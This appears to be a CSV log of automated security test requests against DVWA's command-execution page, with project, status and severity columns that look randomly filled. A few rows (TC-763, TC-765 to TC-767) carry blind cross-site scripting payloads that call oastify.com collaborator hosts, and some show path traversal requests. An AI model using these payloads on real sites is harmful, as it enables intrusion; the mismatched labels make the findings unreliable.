Date of Test Executed,Project ID,Project Name,User ID,User Agent,Testing Scope,Testing Scope Status,Test Case ID,Test Case,Test Case Status,Request Method,Requested Source,Test Case Outcome Message,Error Message,Actual Test Case Outcome,Reason for failure/success,Response Size,Findings (Affected Components),Severity ratings
"Tue, 22 Oct 2024 02:33:18 GMT",PRJ-081,Test Case 648,USER-031,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,Completed,TC-648,Session management,Completed,POST,/DVWA/vulnerabilities/exec/?8y8yuinfbx=1,Pass,,,,4645,Payment gateway,Critical
,PRJ-025,Test Case 649,USER-009,,WEB,In progress,TC-649,Login form,Not Started,,,,,,,,Database,Critical
,PRJ-035,Test Case 650,USER-090,,APP,In progress,TC-650,Login form,Not Started,,,,,,,,User profile page,Low
,PRJ-069,Test Case 651,USER-003,,WEB,In progress,TC-651,Payment gateway,Not Started,,,,,,,,User profile page,Critical
,PRJ-094,Test Case 652,USER-002,,WEB,Not started,TC-652,Login form,Not Started,,,,,,,,Database,Medium
"Tue, 22 Oct 2024 02:33:18 GMT",PRJ-044,Test Case 653,USER-054,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 fh6dtdl6sw,APP,In progress,TC-653,Database,Completed,POST,/DVWA/vulnerabilities/exec/?fh6dtdl6sw=1&utm_content=nnz1c6fycu,Pass,,,,4645,Login form,High
,PRJ-011,Test Case 654,USER-097,,WEB,In progress,TC-654,Database,Not Started,,,,,,,,Login form,Critical
"Tue, 22 Oct 2024 02:33:18 GMT",PRJ-024,Test Case 655,USER-025,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,Not started,TC-655,Login form,Completed,POST,/DVWA/vulnerabilities/exec/,Pass,,,,4645,User profile page,Critical
,PRJ-099,Test Case 656,USER-057,,WEB,Not started,TC-656,Database,Not Started,,,,,,,,Login form,Medium
"Tue, 22 Oct 2024 02:33:18 GMT",PRJ-061,Test Case 657,USER-050,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,Not started,TC-657,Login form,Completed,POST,/DVWA/vulnerabilities/exec/index.php/vvszhb/hrkl1q/cat5yj/,Pass,,,,4645,Session management,Low
,PRJ-033,Test Case 658,USER-062,,APP,In progress,TC-658,Login form,Not Started,,,,,,,,User profile page,Low
"Tue, 22 Oct 2024 02:33:22 GMT",PRJ-031,Test Case 659,USER-082,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,Not started,TC-659,User profile page,Completed,POST,/DVWA/vulnerabilities/exec/,Pass,,,,4645,Payment gateway,Low
,PRJ-051,Test Case 660,USER-032,,WEB,In progress,TC-660,Session management,Not Started,,,,,,,,User profile page,High
,PRJ-099,Test Case 661,USER-012,,WEB,In progress,TC-661,Login form,Not Started,,,,,,,,Session management,High
,PRJ-098,Test Case 662,USER-081,,WEB,In progress,TC-662,User profile page,Not Started,,,,,,,,Session management,Low
"Tue, 22 Oct 2024 02:33:25 GMT",PRJ-017,Test Case 663,USER-063,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B176 Safari/7534.48.3",WEB,Completed,TC-663,Payment gateway,Completed,POST,/DVWA/vulnerabilities/exec/,Pass,,,,4645,Database,Medium
"Tue, 22 Oct 2024 02:33:28 GMT",PRJ-003,Test Case 664,USER-089,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,Completed,TC-664,User profile page,Completed,POST,/DVWA/vulnerabilities/exec/,Pass,,,,4645,Payment gateway,Low
"Tue, 22 Oct 2024 02:33:31 GMT",PRJ-063,Test Case 665,USER-091,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,Completed,TC-665,Database,Completed,POST,/DVWA/vulnerabilities/exec/,Pass,,,,4645,User profile page,Medium
"Tue, 22 Oct 2024 02:33:34 GMT",PRJ-070,Test Case 666,USER-045,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,In progress,TC-666,Session management,Completed,POST,/DVWA/vulnerabilities/exec/,Pass,,,,4645,Session management,Medium
"Tue, 22 Oct 2024 02:33:36 GMT",PRJ-009,Test Case 667,USER-068,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,In progress,TC-667,Payment gateway,Completed,POST,/DVWA/vulnerabilities/exec/?xm09kfufe5=1,Pass,,,,4645,Session management,High
,PRJ-059,Test Case 668,USER-001,,APP,Not started,TC-668,Session management,Not Started,,,,,,,,Payment gateway,Medium
"Tue, 22 Oct 2024 02:33:39 GMT",PRJ-042,Test Case 669,USER-093,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 asyhq11u65,WEB,Not started,TC-669,Session management,Completed,POST,/DVWA/vulnerabilities/exec/?asyhq11u65=1,Pass,,,,4645,Database,Medium
"Tue, 22 Oct 2024 02:33:46 GMT",PRJ-079,Test Case 670,USER-037,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,Completed,TC-670,Payment gateway,Completed,POST,/DVWA/vulnerabilities/exec/index.php/vvszhb/dvwa/css/main.css,Pass,,,,4645,Login form,Low
,PRJ-067,Test Case 671,USER-085,,WEB,Not started,TC-671,User profile page,Not Started,,,,,,,,Login form,Medium
,PRJ-014,Test Case 672,USER-063,,WEB,Not started,TC-672,Session management,Not Started,,,,,,,,Database,Critical
,PRJ-068,Test Case 673,USER-080,,APP,In progress,TC-673,User profile page,Not Started,,,,,,,,Session management,Low
,PRJ-002,Test Case 674,USER-027,,APP,In progress,TC-674,Login form,Not Started,,,,,,,,Payment gateway,Critical
"Tue, 22 Oct 2024 02:33:52 GMT",PRJ-048,Test Case 675,USER-091,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,Completed,TC-675,Login form,Completed,POST,/DVWA/vulnerabilities/exec/,Pass,,,,4645,Login form,High
,PRJ-010,Test Case 676,USER-028,,WEB,Not started,TC-676,Session management,Not Started,,,,,,,,Database,Medium
,PRJ-025,Test Case 677,USER-068,,WEB,In progress,TC-677,Login form,Not Started,,,,,,,,Session management,High
,PRJ-087,Test Case 678,USER-059,,APP,Not started,TC-678,User profile page,Not Started,,,,,,,,Session management,Critical
"Tue, 22 Oct 2024 02:33:55 GMT",PRJ-065,Test Case 679,USER-044,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,In progress,TC-679,Payment gateway,Completed,POST,/DVWA/vulnerabilities/exec/,Pass,,,,4645,Session management,High
"Tue, 22 Oct 2024 02:33:58 GMT",PRJ-048,Test Case 680,USER-053,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,Completed,TC-680,User profile page,Completed,POST,/DVWA/vulnerabilities/exec/,Pass,,,,4645,Session management,Medium
"Tue, 22 Oct 2024 02:34:02 GMT",PRJ-049,Test Case 681,USER-099,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,In progress,TC-681,Database,Completed,POST,/DVWA/vulnerabilities/exec/,Pass,,,,4645,Database,Low
,PRJ-093,Test Case 682,USER-005,,APP,Not started,TC-682,Payment gateway,Not Started,,,,,,,,Login form,High
,PRJ-029,Test Case 683,USER-028,,APP,In progress,TC-683,Session management,Not Started,,,,,,,,Session management,Medium
"Tue, 22 Oct 2024 02:34:07 GMT",PRJ-013,Test Case 684,USER-005,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 z532rrr138,APP,Not started,TC-684,User profile page,Completed,POST,/DVWA/vulnerabilities/exec/?z532rrr138=1,Pass,,,,4645,Payment gateway,High
"Tue, 22 Oct 2024 02:34:14 GMT",PRJ-075,Test Case 685,USER-032,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,In progress,TC-685,Login form,Completed,POST,/DVWA/vulnerabilities/exec/,Pass,,,,4645,Session management,Critical
"Tue, 22 Oct 2024 02:34:17 GMT",PRJ-073,Test Case 686,USER-028,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,In progress,TC-686,User profile page,Completed,POST,/DVWA/vulnerabilities/exec/,Pass,,,,4645,Database,Low
,PRJ-077,Test Case 687,USER-083,,APP,In progress,TC-687,Login form,Not Started,,,,,,,,Login form,High
,PRJ-045,Test Case 688,USER-056,,APP,Not started,TC-688,Session management,Not Started,,,,,,,,Login form,Critical
"Tue, 22 Oct 2024 02:34:20 GMT",PRJ-007,Test Case 689,USER-040,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,Completed,TC-689,Session management,Completed,POST,/DVWA/vulnerabilities/exec/,Pass,,,,4645,User profile page,High
,PRJ-065,Test Case 690,USER-090,,WEB,Not started,TC-690,Database,Not Started,,,,,,,,Database,Low
"Tue, 22 Oct 2024 02:34:23 GMT",PRJ-029,Test Case 691,USER-056,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,Not started,TC-691,User profile page,Completed,POST,/DVWA/vulnerabilities/exec/,Pass,,,,4645,Payment gateway,Low
"Tue, 22 Oct 2024 02:34:32 GMT",PRJ-061,Test Case 692,USER-074,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,In progress,TC-692,Login form,Completed,POST,/DVWA/vulnerabilities/exec/,Pass,,,,4645,Database,Critical
"Tue, 22 Oct 2024 02:34:35 GMT",PRJ-090,Test Case 693,USER-017,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,Completed,TC-693,User profile page,Completed,POST,/DVWA/vulnerabilities/exec/,Pass,,,,4645,Database,Critical
,PRJ-084,Test Case 694,USER-074,,WEB,Not started,TC-694,Login form,Not Started,,,,,,,,Payment gateway,Critical
,PRJ-042,Test Case 695,USER-088,,WEB,In progress,TC-695,Database,Not Started,,,,,,,,Payment gateway,High
,PRJ-025,Test Case 696,USER-042,,APP,In progress,TC-696,User profile page,Not Started,,,,,,,,Payment gateway,Critical
,PRJ-080,Test Case 697,USER-019,,APP,Not started,TC-697,User profile page,Not Started,,,,,,,,Payment gateway,Medium
,PRJ-097,Test Case 698,USER-094,,WEB,Not started,TC-698,User profile page,Not Started,,,,,,,,Session management,Medium
,PRJ-037,Test Case 699,USER-002,,APP,In progress,TC-699,Database,Not Started,,,,,,,,Database,Low
,PRJ-043,Test Case 700,USER-027,,WEB,In progress,TC-700,Session management,Not Started,,,,,,,,Database,Medium
"Tue, 22 Oct 2024 02:34:38 GMT",PRJ-089,Test Case 701,USER-090,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,Completed,TC-701,Session management,Completed,POST,/DVWA/vulnerabilities/exec/,Pass,,,,4645,Login form,High
,PRJ-022,Test Case 702,USER-008,,APP,In progress,TC-702,Login form,Not Started,,,,,,,,Database,Low
"Tue, 22 Oct 2024 02:34:44 GMT",PRJ-009,Test Case 703,USER-050,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,Not started,TC-703,Login form,Completed,POST,/DVWA/vulnerabilities/exec/,Pass,,,,4645,Payment gateway,Critical
"Tue, 22 Oct 2024 02:34:47 GMT",PRJ-030,Test Case 704,USER-049,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,In progress,TC-704,Session management,Completed,POST,/DVWA/vulnerabilities/exec/,Pass,,,,4645,Session management,Low
,PRJ-024,Test Case 705,USER-026,,APP,Not started,TC-705,User profile page,Not Started,,,,,,,,Session management,High
,PRJ-043,Test Case 706,USER-063,,APP,Not started,TC-706,Payment gateway,Not Started,,,,,,,,Payment gateway,High
"Tue, 22 Oct 2024 02:34:55 GMT",PRJ-081,Test Case 707,USER-039,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,Not started,TC-707,Payment gateway,Completed,POST,/DVWA/vulnerabilities/exec/,Pass,,,,4524,Database,Low
,PRJ-072,Test Case 708,USER-036,,WEB,In progress,TC-708,Database,Not Started,,,,,,,,User profile page,Low
"Tue, 22 Oct 2024 02:34:58 GMT",PRJ-094,Test Case 709,USER-049,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,Not started,TC-709,Session management,Completed,POST,/DVWA/vulnerabilities/exec/,Pass,,,,4535,User profile page,Critical
"Tue, 22 Oct 2024 02:35:13 GMT",PRJ-040,Test Case 710,USER-078,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,Completed,TC-710,User profile page,Completed,POST,/DVWA/vulnerabilities/exec/,Pass,,,,4270,User profile page,Medium
,PRJ-075,Test Case 711,USER-070,,WEB,In progress,TC-711,Session management,Not Started,,,,,,,,User profile page,Critical
"Tue, 22 Oct 2024 02:35:29 GMT",PRJ-099,Test Case 712,USER-019,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,Not started,TC-712,Session management,Completed,POST,/DVWA/vulnerabilities/exec/,Pass,,,,4645,Session management,Low
,PRJ-024,Test Case 713,USER-041,,WEB,In progress,TC-713,Database,Not Started,,,,,,,,Database,High
,PRJ-057,Test Case 714,USER-096,,APP,Not started,TC-714,Login form,Not Started,,,,,,,,User profile page,Medium
,PRJ-004,Test Case 715,USER-098,,APP,Not started,TC-715,User profile page,Not Started,,,,,,,,Login form,High
,PRJ-011,Test Case 716,USER-089,,APP,In progress,TC-716,Payment gateway,Not Started,,,,,,,,User profile page,Critical
,PRJ-063,Test Case 717,USER-061,,WEB,Not started,TC-717,User profile page,Not Started,,,,,,,,Login form,Critical
"Tue, 22 Oct 2024 02:35:33 GMT",PRJ-098,Test Case 718,USER-002,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,Not started,TC-718,User profile page,Completed,POST,/DVWA/vulnerabilities/exec/,Fail,HTTP/1.1 302 Found,,,152,User profile page,Low
"Tue, 22 Oct 2024 02:35:34 GMT",PRJ-023,Test Case 719,USER-057,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,In progress,TC-719,User profile page,Completed,GET,/DVWA/vulnerabilities/exec/index.php,Pass,,,,4446,Database,Critical
"Tue, 22 Oct 2024 02:35:35 GMT",PRJ-006,Test Case 720,USER-078,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,In progress,TC-720,Session management,Completed,POST,/DVWA/vulnerabilities/exec/,Fail,HTTP/1.1 302 Found,,,0,Session management,Low
"Tue, 22 Oct 2024 02:35:37 GMT",PRJ-067,Test Case 721,USER-014,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,Not started,TC-721,User profile page,Completed,GET,/DVWA/vulnerabilities/exec/../../login.php,Pass,,,,1342,Session management,Critical
,PRJ-095,Test Case 722,USER-006,,APP,Not started,TC-722,Payment gateway,Not Started,,,,,,,,Database,Critical
,PRJ-039,Test Case 723,USER-037,,APP,In progress,TC-723,Payment gateway,Not Started,,,,,,,,Session management,Low
"Tue, 22 Oct 2024 02:35:38 GMT",PRJ-089,Test Case 724,USER-067,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,Completed,TC-724,Database,Completed,POST,/DVWA/vulnerabilities/exec/,Pass,,,,4645,Login form,Low
"Tue, 22 Oct 2024 02:35:42 GMT",PRJ-024,Test Case 725,USER-075,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,In progress,TC-725,Payment gateway,Completed,POST,/DVWA/vulnerabilities/exec/?pd6cflp38gw6inp02zf4kmggw724qxep6d00rog=1,Pass,,,,4645,Database,Low
"Tue, 22 Oct 2024 02:35:46 GMT",PRJ-023,Test Case 726,USER-059,4y3r00aitvhl32afne0j511vhmnjbcz4rsmfc31,WEB,Not started,TC-726,Payment gateway,Completed,POST,/DVWA/vulnerabilities/exec/,Pass,,,,4645,Payment gateway,Medium
,PRJ-092,Test Case 727,USER-094,,WEB,Not started,TC-727,Database,Not Started,,,,,,,,Payment gateway,Low
,PRJ-068,Test Case 728,USER-091,,APP,In progress,TC-728,Session management,Not Started,,,,,,,,Database,Low
,PRJ-099,Test Case 729,USER-022,,APP,Not started,TC-729,User profile page,Not Started,,,,,,,,User profile page,Low
"Tue, 22 Oct 2024 02:35:50 GMT",PRJ-054,Test Case 730,USER-040,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,In progress,TC-730,User profile page,Completed,POST,/DVWA/vulnerabilities/exec/,Pass,,,,4645,Login form,Medium
,PRJ-026,Test Case 731,USER-001,,APP,In progress,TC-731,Database,Not Started,,,,,,,,Database,Low
,PRJ-078,Test Case 732,USER-064,,WEB,In progress,TC-732,Database,Not Started,,,,,,,,Database,Critical
,PRJ-011,Test Case 733,USER-077,,WEB,In progress,TC-733,Session management,Not Started,,,,,,,,Session management,Medium
,PRJ-007,Test Case 734,USER-024,,WEB,In progress,TC-734,Login form,Not Started,,,,,,,,User profile page,Low
"Tue, 22 Oct 2024 02:35:54 GMT",PRJ-086,Test Case 735,USER-074,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,Not started,TC-735,Login form,Completed,POST,/ld28fhpz8cw2ijpw2vf0kigcw320qtel693wtki/vulnerabilities/exec/,Fail,HTTP/1.1 404 Not Found,,,271,Login form,Critical
,PRJ-023,Test Case 736,USER-021,,APP,In progress,TC-736,Session management,Not Started,,,,,,,,Payment gateway,Low
"Tue, 22 Oct 2024 02:35:54 GMT",PRJ-012,Test Case 737,USER-099,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,In progress,TC-737,Database,Completed,POST,/DVWA/2dgpfypg8twji0pd2cfhkzgtwk2hqae26q3du1j/exec/,Fail,HTTP/1.1 404 Not Found,,,271,Login form,Critical
"Tue, 22 Oct 2024 02:35:54 GMT",PRJ-071,Test Case 738,USER-009,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,Not started,TC-738,Login form,Completed,POST,/DVWA/vulnerabilities/2ehpgyqg9txjj0qd3cghlzhtxk3hraf27q4dw1l/,Fail,HTTP/1.1 404 Not Found,,,271,Payment gateway,High
,PRJ-068,Test Case 739,USER-053,,WEB,Not started,TC-739,Login form,Not Started,,,,,,,,Session management,Low
"Tue, 22 Oct 2024 02:35:54 GMT",PRJ-062,Test Case 740,USER-093,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,Completed,TC-740,Payment gateway,Completed,POST,/DVWA/vulnerabilities/exec/,Pass,,,,4645,Payment gateway,High
"Tue, 22 Oct 2024 02:35:58 GMT",PRJ-017,Test Case 741,USER-079,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,In progress,TC-741,User profile page,Completed,POST,/DVWA/vulnerabilities/exec/,Pass,,,,4645,Session management,Medium
,PRJ-091,Test Case 742,USER-038,,WEB,Not started,TC-742,Login form,Not Started,,,,,,,,Database,Low
"Tue, 22 Oct 2024 02:36:02 GMT",PRJ-095,Test Case 743,USER-027,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,Not started,TC-743,Payment gateway,Completed,POST,/DVWA/vulnerabilities/exec/,Pass,,,,4270,Payment gateway,Medium
"Tue, 22 Oct 2024 02:36:03 GMT",PRJ-002,Test Case 744,USER-082,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,In progress,TC-744,Login form,Completed,POST,/DVWA/vulnerabilities/exec/,Pass,,,,4270,Payment gateway,High
,PRJ-065,Test Case 745,USER-071,,APP,Not started,TC-745,Payment gateway,Not Started,,,,,,,,Payment gateway,Critical
,PRJ-093,Test Case 746,USER-073,,WEB,Not started,TC-746,Payment gateway,Not Started,,,,,,,,Payment gateway,Critical
"Tue, 22 Oct 2024 02:36:04 GMT",PRJ-061,Test Case 747,USER-005,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,Not started,TC-747,Database,Completed,POST,/DVWA/vulnerabilities/exec/,Pass,,,,4645,Session management,High
"Tue, 22 Oct 2024 02:36:08 GMT",PRJ-060,Test Case 748,USER-053,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,Completed,TC-748,Payment gateway,Completed,POST,/DVWA/vulnerabilities/exec/,Pass,,,,4645,Session management,Low
"Tue, 22 Oct 2024 02:36:13 GMT",PRJ-027,Test Case 749,USER-074,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,Not started,TC-749,User profile page,Completed,POST,/DVWA/vulnerabilities/exec/,Fail,HTTP/1.1 302 Found,,,152,Payment gateway,Low
"Tue, 22 Oct 2024 02:36:14 GMT",PRJ-044,Test Case 750,USER-049,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,Not started,TC-750,Session management,Completed,GET,/DVWA/vulnerabilities/exec/index.php,Pass,,,,4446,Login form,High
"Tue, 22 Oct 2024 02:36:15 GMT",PRJ-091,Test Case 751,USER-041,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,In progress,TC-751,Login form,Completed,POST,/DVWA/vulnerabilities/exec/,Fail,HTTP/1.1 302 Found,,,152,Database,Medium
,PRJ-048,Test Case 752,USER-058,,APP,In progress,TC-752,User profile page,Not Started,,,,,,,,Login form,High
"Tue, 22 Oct 2024 02:36:16 GMT",PRJ-005,Test Case 753,USER-026,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,Completed,TC-753,Login form,Completed,GET,/DVWA/vulnerabilities/exec/index.php,Pass,,,,4446,Database,Medium
"Tue, 22 Oct 2024 02:36:17 GMT",PRJ-025,Test Case 754,USER-044,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,In progress,TC-754,User profile page,Completed,POST,/DVWA/vulnerabilities/exec/,Fail,HTTP/1.1 302 Found,,,0,Login form,Medium
"Tue, 22 Oct 2024 02:36:18 GMT",PRJ-027,Test Case 755,USER-093,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,In progress,TC-755,Session management,Completed,GET,/DVWA/vulnerabilities/exec/../../login.php,Pass,,,,1342,Login form,Low
"Tue, 22 Oct 2024 02:36:19 GMT",PRJ-040,Test Case 756,USER-006,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,In progress,TC-756,Login form,Completed,POST,/DVWA/vulnerabilities/exec/,Fail,HTTP/1.1 302 Found,,,0,Login form,High
,PRJ-003,Test Case 757,USER-074,,APP,In progress,TC-757,User profile page,Not Started,,,,,,,,User profile page,High
"Tue, 22 Oct 2024 02:36:20 GMT",PRJ-036,Test Case 758,USER-069,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,Completed,TC-758,Login form,Completed,GET,/DVWA/vulnerabilities/exec/../../login.php,Pass,,,,1342,Payment gateway,Medium
,PRJ-021,Test Case 759,USER-036,,WEB,Not started,TC-759,User profile page,Not Started,,,,,,,,Session management,High
,PRJ-071,Test Case 760,USER-041,,APP,In progress,TC-760,Session management,Not Started,,,,,,,,User profile page,Medium
"Tue, 22 Oct 2024 02:36:21 GMT",PRJ-010,Test Case 761,USER-040,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,Not started,TC-761,User profile page,Completed,POST,/DVWA/vulnerabilities/exec/,Pass,,,,4645,Login form,Critical
"Tue, 22 Oct 2024 02:36:25 GMT",PRJ-087,Test Case 762,USER-007,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,Not started,TC-762,Login form,Completed,POST,/DVWA/vulnerabilities/exec/,Pass,,,,4645,Database,Critical
"Tue, 22 Oct 2024 02:36:29 GMT",PRJ-023,Test Case 763,USER-091,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,In progress,TC-763,Payment gateway,Completed,POST,/DVWA/vulnerabilities/exec/?'%22%3e%3csvg%2fonload%3dfetch%60%2f%2fen51pazsi56vsczpcoptubq56wct0moee28pzdo%5c.oastify.com%60%3e=1,Pass,,,,4645,User profile page,Low
,PRJ-097,Test Case 764,USER-098,,APP,Not started,TC-764,Database,Not Started,,,,,,,,Login form,Critical
"Tue, 22 Oct 2024 02:36:33 GMT",PRJ-040,Test Case 765,USER-088,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,Not started,TC-765,User profile page,Completed,POST,/DVWA/vulnerabilities/exec/?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2f7s0uu34lnybox54ihhumz4vybphm5ft7kvei56uX%3b.oastify.com%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1,Pass,,,,4645,User profile page,High
"Tue, 22 Oct 2024 02:36:37 GMT",PRJ-047,Test Case 766,USER-051,"'""><svg/onload=fetch`//hbw4ddnv68uygfns0rdwiee8uz0wopch25xsngc\.oastify.com`>",WEB,In progress,TC-766,Database,Completed,POST,/DVWA/vulnerabilities/exec/,Pass,,,,4645,Database,Low
"Tue, 22 Oct 2024 02:36:41 GMT",PRJ-009,Test Case 767,USER-061,"javascript:/*</script><img/onerror='-/""/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/ehz1jatsc50vmctp6ojtobk50w6tumie924pudjX;.oastify.com/).replace(/.;/g,[])]//'src=>",WEB,In progress,TC-767,Database,Completed,POST,/DVWA/vulnerabilities/exec/,Pass,,,,4645,User profile page,High
,PRJ-099,Test Case 768,USER-045,,WEB,In progress,TC-768,Login form,Not Started,,,,,,,,Payment gateway,Low
"Tue, 22 Oct 2024 02:36:45 GMT",PRJ-039,Test Case 769,USER-069,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,Completed,TC-769,Database,Completed,POST,/DVWA/vulnerabilities/exec/,Pass,,,,4645,User profile page,Medium
"Tue, 22 Oct 2024 02:36:49 GMT",PRJ-071,Test Case 770,USER-021,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,Not started,TC-770,Payment gateway,Completed,POST,/DVWA/vulnerabilities/exec/,Pass,,,,4645,User profile page,Critical
,PRJ-056,Test Case 771,USER-073,,APP,Not started,TC-771,Login form,Not Started,,,,,,,,Session management,Critical
